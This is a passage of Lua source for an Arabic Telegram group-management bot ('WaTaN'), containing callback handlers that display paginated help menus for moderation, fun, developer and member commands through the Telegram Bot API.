{text = '• ❶ •', callback_data="/help1"..data.sender_user_id_},{text = '• ❷ •', callback_data="/help2"..data.sender_user_id_},{text = '• ❸ •', callback_data="/help3"..data.sender_user_id_},
},
{
{text = '• ❹ •', callback_data="/help4"..data.sender_user_id_},{text = '• ❺ •', callback_data="/help5"..data.sender_user_id_},
},
{
{text = '• ❻ •', callback_data="/help6"..data.sender_user_id_},{text = '• ❼ •', callback_data="/help7"..data.sender_user_id_},{text = '• ❽ •', callback_data="/help8"..data.sender_user_id_},
},
{
{text = '• ❾ •', callback_data="/help9"..data.sender_user_id_},{text = '• ❶⓿ •', callback_data="/help10"..data.sender_user_id_},
},
{
{text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/helpback"..data.sender_user_id_},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
return https.request("https://api.telegram.org/bot"..token..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯︙عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if Text and Text:match('/help6(.*)') then
local Abbs = Text:match('/help6(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Mod(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local help_text = database:get(bot_id..'help6_text')
local Teext =[[
🎫┇𝙶𝚁𝙾𝚄𝙿 𝙾𝚁𝙳𝙴𝚁𝚂 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊 .
✯︙اوامر المجموعه 📢 .
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الاوامر كالتالي ♻️ ↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙استعاده الاوامر 
✯︙ترتيب الاوامر
✯︙اضف/مسح امر
✯︙مسح الاوامر المضافه
✯︙تحويل كالاتي➸ بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
✯︙صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين
✯︙كشف القيود
✯︙تعين الايدي
✯︙تغير الايدي
✯︙مسح نقاطه/رسائله
✯︙الحساب + ايدي الحساب
✯︙جهاته
✯︙تنظيف + العدد
✯︙وضع وقت التنظيف
✯︙مسح + العدد
✯︙تنظيف الميديا ← لمسح جميع الميديا
✯︙امسح ← لمسح عدد من الوسائط الموجوده
✯︙منع + بالرد
✯︙~ الصور + متحركه + ملصق ~
✯︙حظر ~ كتم ~ تقيد ~ طرد
✯︙المحظورين ~ المكتومين ~ المقيدين
✯︙الغاء كتم + حظر + تقيد ~ بالرد و معرف و ايدي
✯︙تقيد ~ كتم + الرقم + ساعه
✯︙تقيد ~ كتم + الرقم + يوم
✯︙تقيد ~ كتم + الرقم + دقيقه
✯︙مسح ~ المكتومين + المحظورين + المقيدين
✯︙تثبيت ~ الغاء تثبيت
✯︙الترحيب
✯︙الغاء تثبيت الكل
✯︙كشف البوتات
✯︙الصلاحيات
✯︙كشف ~ بالرد ← بمعرف ← ايدي
✯︙تاك للكل
✯︙وضع لقب + لقب
✯︙حذف لقب بالرد
✯︙الاعدادات
✯︙عدد الكروب
✯︙ردود المدير
✯︙اسم بوت + الرتبه
✯︙الاوامر المضافه
✯︙وضع توحيد + توحيد
✯︙تعين عدد الكتم + رقم
✯︙كتم اسم + اسم
✯︙التوحيد

✯︙قائمه المنع
✯︙نسبه الحب 
✯︙نسبه رجوله
✯︙نسبه الكره
✯︙نسبه الانوثه
✯︙الساعه
✯︙التاريخ
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❶ •', callback_data="/help1"..data.sender_user_id_},{text = '• ❷ •', callback_data="/help2"..data.sender_user_id_},{text = '• ❸ •', callback_data="/help3"..data.sender_user_id_},
},
{
{text = '• ❹ •', callback_data="/help4"..data.sender_user_id_},{text = '• ❺ •', callback_data="/help5"..data.sender_user_id_},
},
{
{text = '• ❻ •', callback_data="/help6"..data.sender_user_id_},{text = '• ❼ •', callback_data="/help7"..data.sender_user_id_},{text = '• ❽ •', callback_data="/help8"..data.sender_user_id_},
},
{
{text = '• ❾ •', callback_data="/help9"..data.sender_user_id_},{text = '• ❶⓿ •', callback_data="/help10"..data.sender_user_id_},
},
{
{text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/helpback"..data.sender_user_id_},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
return https.request("https://api.telegram.org/bot"..token..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯︙عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if Text and Text:match('/help7(.*)') then
local Abbs = Text:match('/help7(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Mod(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local help_text = database:get(bot_id..'help7_text')
local Teext =[[
🤹🏻┇𝙵𝚄𝙽𝙽𝚈 𝙾𝚁𝙳𝙴𝚁𝚂 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙الاوامر التحشيش 🃏
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← الامࢪ ↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← مطي 
✯︙تاك للمطايه
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← صخل
✯︙تاك لصخوله
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← جلب
✯︙تاك لجلاب
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← قرد 
✯︙تاك لقروده
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← بقره
✯︙تاك لبقرات
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← ضلع
✯︙تاك لضلوع
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← ضلعه
✯︙تاك للضلعات
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← طلي
✯︙تاك لطليان
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← زاحف 
✯︙تاك لزواحف
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← جريذي
✯︙تاك لجريذيه
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← الصاك
✯︙تاك للصاكين
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← الحاته
✯︙تاك للحاتات
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❶ •', callback_data="/help1"..data.sender_user_id_},{text = '• ❷ •', callback_data="/help2"..data.sender_user_id_},{text = '• ❸ •', callback_data="/help3"..data.sender_user_id_},
},
{
{text = '• ❹ •', callback_data="/help4"..data.sender_user_id_},{text = '• ❺ •', callback_data="/help5"..data.sender_user_id_},
},
{
{text = '• ❻ •', callback_data="/help6"..data.sender_user_id_},{text = '• ❼ •', callback_data="/help7"..data.sender_user_id_},{text = '• ❽ •', callback_data="/help8"..data.sender_user_id_},
},
{
{text = '• ❾ •', callback_data="/help9"..data.sender_user_id_},{text = '• ❶⓿ •', callback_data="/help10"..data.sender_user_id_},
},
{
{text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/helpback"..data.sender_user_id_},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
return https.request("https://api.telegram.org/bot"..token..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯︙عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if Text and Text:match('/help8(.*)') then
local Abbs = Text:match('/help8(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Sudo(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local help_text = database:get(bot_id..'help8_text')
local Teext =[[
🏅┇𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁𝚂' 𝙾𝚁𝙳𝙴𝚁𝚂 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اوامر المطورين ( 👥).
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تفعيل ← تعطيل 
✯︙المجموعات ← المشتركين ← الاحصائيات
✯︙رفع ← تنزيل مالك
✯︙مسح المالكين ← المالكين
✯︙مسح الاساسين ← المنشئين الاساسين
✯︙مسح المنشئين ← المنشئين
✯︙اسم ~ ايدي + بوت غادر 
✯︙اذاعه 
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❶ •', callback_data="/help1"..data.sender_user_id_},{text = '• ❷ •', callback_data="/help2"..data.sender_user_id_},{text = '• ❸ •', callback_data="/help3"..data.sender_user_id_},
},
{
{text = '• ❹ •', callback_data="/help4"..data.sender_user_id_},{text = '• ❺ •', callback_data="/help5"..data.sender_user_id_},
},
{
{text = '• ❻ •', callback_data="/help6"..data.sender_user_id_},{text = '• ❼ •', callback_data="/help7"..data.sender_user_id_},{text = '• ❽ •', callback_data="/help8"..data.sender_user_id_},
},
{
{text = '• ❾ •', callback_data="/help9"..data.sender_user_id_},{text = '• ❶⓿ •', callback_data="/help10"..data.sender_user_id_},
},
{
{text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/helpback"..data.sender_user_id_},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
return https.request("https://api.telegram.org/bot"..token..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯︙عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if Text and Text:match('/help9(.*)') then
local Abbs = Text:match('/help9(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Sudo(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local help_text = database:get(bot_id..'help9_text')
local Teext =[[
🎖┇ 𝙱𝙰𝚂𝙸𝙲 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊
✯︙اوامر مطور الاساسي 👨🏼‍✈️
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تفعيل
✯︙تعطيل
✯︙تفعيل/تعطيل الجلب التلقائي
✯︙تفعيل/تعطيل الوضع المدفوع
✯︙الكروبات المدفوعه
✯︙رفع/تنزيل مطور ثانوي 
✯︙مسح المطورين
✯︙المطورين
✯︙رفع | تنزيل مطور
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اسم البوت + غادر
✯︙غادر
✯︙اسم بوت + الرتبه
✯︙حظر عام
✯︙كتم عام
✯︙الغاء العام
✯︙المحظورين عام
✯︙مسح المحظورين عام
✯︙مسح المكتومين عام
✯︙جلب نسخه الاحتياطيه
✯︙رفع نسخه الاحتياطيه
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تحديث السورس
✯︙تحديث المتجر
✯︙المتجر 
✯︙متجر الملفات
✯︙الملفات
✯︙مسح الملفات
✯︙تعطيل + تفعيل + اسم ملف
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اذاعه خاص
✯︙اذاعه
✯︙اذاعه بالتوجيه
✯︙اذاعه بالتوجيه خاص
✯︙اذاعه بالتثبيت
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙جلب ملف السورس
✯︙رفع ملف السورس
✯︙جلب ملف الردود
✯︙جلب ملف الالعاب
✯︙ضع عدد الاعضاء + العدد
✯︙ضع كليشه المطور
✯︙تفعيل/تعطيل الاذاعه
✯︙تفعيل/تعطيل البوت الخدمي
✯︙تفعيل/تعطيل التواصل
✯︙تغير اسم البوت
✯︙اضف/حذف رد للكل
✯︙ردود المطور
✯︙مسح ردود المطور
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الاشتراك الاجباري
✯︙تعطيل الاشتراك الاجباري
✯︙تفعيل الاشتراك الاجباري
✯︙حذف رساله الاشتراك
✯︙تغير رساله الاشتراك
✯︙تغير الاشتراك
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تغير المطور الاساسي
✯︙الاحصائيات
✯︙المشتركين
✯︙المجموعات 
✯︙روابط الكروبات
✯︙تفعيل/تعطيل المغادره
✯︙تنظيف المشتركين
✯︙تنظيف الكروبات
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❶ •', callback_data="/help1"..data.sender_user_id_},{text = '• ❷ •', callback_data="/help2"..data.sender_user_id_},{text = '• ❸ •', callback_data="/help3"..data.sender_user_id_},
},
{
{text = '• ❹ •', callback_data="/help4"..data.sender_user_id_},{text = '• ❺ •', callback_data="/help5"..data.sender_user_id_},
},
{
{text = '• ❻ •', callback_data="/help6"..data.sender_user_id_},{text = '• ❼ •', callback_data="/help7"..data.sender_user_id_},{text = '• ❽ •', callback_data="/help8"..data.sender_user_id_},
},
{
{text = '• ❾ •', callback_data="/help9"..data.sender_user_id_},{text = '• ❶⓿ •', callback_data="/help10"..data.sender_user_id_},
},
{
{text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/helpback"..data.sender_user_id_},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
return https.request("https://api.telegram.org/bot"..token..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯︙عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if Text and Text:match('/help10(.*)') then
local Abbs = Text:match('/help10(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
local help_text = database:get(bot_id..'help10_text')
local Teext =[[
🎒┇𝙼𝙴𝙼𝙱𝙴𝚁 𝙾𝚁𝙳𝙴𝚁𝚂 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊 .
✯︙اوامر الاعضاء كالتالي ↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙عرض معلوماتك ↑↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙ايديي ← اسمي 
✯︙بايو ~ البايو
✯︙رسايلي ← مسح رسايلي 
✯︙رتبتي ← سحكاتي 
✯︙مسح سحكاتي ← المالك 
✯︙مطور السورس
✯︙قناة السورس
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اوآمر المجموعه ↑↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الرابط ← القوانين – الترحيب
✯︙ايدي ← اطردني 
✯︙اسمي ← المطور  
✯︙كشف ~ بالرد بالمعرف
✯︙كول + كلمه
✯︙غنيلي
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اسم البوت + الامر ↑↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙بوسه بالرد 
✯︙مصه بالرد
✯︙رزله بالرد 
✯︙شنو رئيك بهذا بالرد
✯︙شنو رئيك بهاي بالرد
✯︙تحب هذا
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❶ •', callback_data="/help1"..data.sender_user_id_},{text = '• ❷ •', callback_data="/help2"..data.sender_user_id_},{text = '• ❸ •', callback_data="/help3"..data.sender_user_id_},
},
{
{text = '• ❹ •', callback_data="/help4"..data.sender_user_id_},{text = '• ❺ •', callback_data="/help5"..data.sender_user_id_},
},
{
{text = '• ❻ •', callback_data="/help6"..data.sender_user_id_},{text = '• ❼ •', callback_data="/help7"..data.sender_user_id_},{text = '• ❽ •', callback_data="/help8"..data.sender_user_id_},
},
{
{text = '• ❾ •', callback_data="/help9"..data.sender_user_id_},{text = '• ❶⓿ •', callback_data="/help10"..data.sender_user_id_},
},
{
{text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/helpback"..data.sender_user_id_},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
return https.request("https://api.telegram.org/bot"..token..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯︙عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if Text and Text:match('/helpback(.*)') then
local Abbs = Text:match('/helpback(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Mod(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local help_text = database:get(bot_id..'help_text')
local Teext =[[
*🖥┇𝚂𝙾𝚄𝚁𝙲𝙴 𝚆𝙰𝚃𝙰𝙽 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 .*
*┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ *
*⚙️ | اهلا انت في اوامر البوت الرئيسية 🔏*
*⚙️ | اختر في الاسفل الرقم التابع للأمر 🔍*
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
*❶◂ اوامر الحمايه .*
*❷◂ اوامر تعطيل ~ تفعيل .*
*❸◂ اوامر ضع ~ اضف  .*
*❹◂ اوامر مسح ~ حذف .*
*❺◂ اوامر تنزيل+رفع+التغير .*
*❻◂ اوامر الكروب .*
*❼◂ اوامر التحشيش .*
*❽◂ اوامر مطور البوت .*
*❾◂ اوامر مطور الاساسي .*
*⓿❶◂ اوامر الاعضاء .*
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❶ •', callback_data="/help1"..data.sender_user_id_},{text = '• ❷ •', callback_data="/help2"..data.sender_user_id_},{text = '• ❸ •', callback_data="/help3"..data.sender_user_id_},
},
{
{text = '• ❹ •', callback_data="/help4"..data.sender_user_id_},{text = '• ❺ •', callback_data="/help5"..data.sender_user_id_},
},
{
{text = '• ❻ •', callback_data="/help6"..data.sender_user_id_},{text = '• ❼ •', callback_data="/help7"..data.sender_user_id_},{text = '• ❽ •', callback_data="/help8"..data.sender_user_id_},
},
{
{text = '• ❾ •', callback_data="/help9"..data.sender_user_id_},{text = '• ❶⓿ •', callback_data="/help10"..data.sender_user_id_},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
return https.request("https://api.telegram.org/bot"..token..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯︙عذرا الامر ليس لك .")..'&show_alert=true')
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ ----- callback add dev mr WaTaN
if Text == '/mute-name' then
if not Constructor(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
انت الان في قائمة كتم الأسماء
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
الاوامر الخاصة فـي كتم الاسماء 
تفعيل كتم الاسم
تعطيل كتم الاسم
الاسماء المكتومه
كتم اسم + الاسم المراد كتمه
الغاء كتم اسم + الاسم المراد الغاء كتمه
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/WaTaN"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '🔙 القائمة الرئيسيه 🔙', callback_data="/add"},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/WaTaN' then
if not Constructor(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
انت الان في قائمة التوحيد
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
الاوامر الخاصة فـي التوحيد 
تفعيل التوحيد
تعطيل التوحيد
وضع توحيد + التوحيد
تعين عدد الكتم + عدد
التوحيد
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/WaTaN"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '🔙 القائمة الرئيسيه 🔙', callback_data="/add"},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂??𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/change-names' then
if not Constructor(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
انت الان في قائمة تنبيه الاسماء
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
الاوامر الخاصة فـي تنبيه الاسماء 
تفعيل تنبيه الاسماء
تعطيل تنبيه الاسماء
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/WaTaN"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '🔙 القائمة الرئيسيه 🔙', callback_data="/add"},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/change-id' then
if not Constructor(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
انت الان في قائمة تنبيه المعرف
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
الاوامر الخاصة فـي تنبيه المعرف
تفعيل تنبيه المعرف
تعطيل تنبيه المعرف
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/WaTaN"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '🔙 القائمة الرئيسيه 🔙', callback_data="/add"},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/change-photo' then
if not Constructor(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
انت الان في قائمة تنبيه الصور
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
الاوامر الخاصة فـي تنبيه الصور
تفعيل تنبيه الصور
تعطيل تنبيه الصور
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/WaTaN"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '🔙 القائمة الرئيسيه 🔙', callback_data="/add"},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
